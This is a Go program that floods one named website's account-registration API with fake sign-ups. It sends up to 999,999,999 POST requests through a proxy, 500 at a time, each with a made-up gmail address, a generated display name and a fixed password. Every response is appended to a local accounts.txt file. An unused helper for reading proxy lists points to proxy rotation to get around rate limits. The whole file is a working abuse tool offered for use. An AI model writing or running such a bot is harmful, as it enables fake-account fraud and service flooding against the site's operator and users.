package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

type AccountData struct {
	Password    string `json:"password"`
	PhotoURL    string `json:"photoURL"`
	DiscordUser string `json:"discord_user"`
}

type Payload struct {
	CreationEmail string      `json:"creation_email"`
	DisplayName   string      `json:"display_name"`
	AccountData   AccountData `json:"account_data"`
}

func main() {
	rand.Seed(time.Now().UnixNano())

	requestURL := "https://www.abyssdigital.xyz/api/auth/register"

	proxy := "http://user:pass@ip:port"

	var wg sync.WaitGroup
	concurrency := 500 // number of concurrent goroutines
	sem := make(chan bool, concurrency)

	for i := 0; i < 999999999; i++ { // accounts to create
		wg.Add(1)
		sem <- true
		go func() {
			defer wg.Done()
			defer func() { <-sem }()

			randID := rand.Intn(999999) // random number for email and display name to avoid duplicates
			email := fmt.Sprintf("user%d@gmail.com", randID)
			displayName := fmt.Sprintf("User%d", randID)

			payload := Payload{
				CreationEmail: email,
				DisplayName:   displayName,
				AccountData: AccountData{
					Password:    "BOSSFck_GENNED_BY_USER319183",
					PhotoURL:    "/Images/AbyssDesigner.png",
					DiscordUser: "",
				},
			}

			err := sendRequest(requestURL, payload, proxy)
			if err != nil {
				log.Println("Error:", err)
			}
		}()
	}

	wg.Wait()
}

func readProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	return proxies, scanner.Err()
}

func sendRequest(requestURL string, payload Payload, proxy string) error {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", requestURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/json")

	proxyURL, err := url.Parse(proxy)
	if err != nil {
		return err
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
	}

	client := &http.Client{Transport: transport}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	log.Println("Response Status:", resp.Status)
	log.Println("Response Body:", string(body))

	err = storeAccountDetails(payload, string(body))
	if err != nil {
		log.Println("Error storing account details:", err)
	}

	return nil
}

func storeAccountDetails(payload Payload, response string) error {
	file, err := os.OpenFile("accounts.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(fmt.Sprintf("Email: %s, DisplayName: %s, Response: %s\n", payload.CreationEmail, payload.DisplayName, response))
	return err
}